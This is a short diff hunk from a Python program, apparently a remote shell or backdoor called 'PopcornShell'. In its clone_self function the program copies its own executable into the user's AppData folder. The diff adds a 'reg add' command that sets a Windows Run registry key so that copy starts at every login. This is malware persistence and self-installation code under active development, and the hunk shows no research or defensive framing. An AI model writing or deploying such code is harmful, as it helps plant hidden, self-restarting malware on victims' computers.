@@ -107,9 +107,11 @@ def run_command(cmd):
     return payload
 
 def clone_self():
-    path = os.environ["appdata"] + "\\PopcorenShell.exe"
+    path = os.environ["AppData"] + "\\PopcorenShell.exe"
     if not os.path.exists(path):
         shutil.copyfile(sys.executable, path)
+        cmd = f"reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v PopcornShell /t REG_SZ /d \"{path}\""
+        subprocess.call(cmd, shell=True)
 
 
 def main():
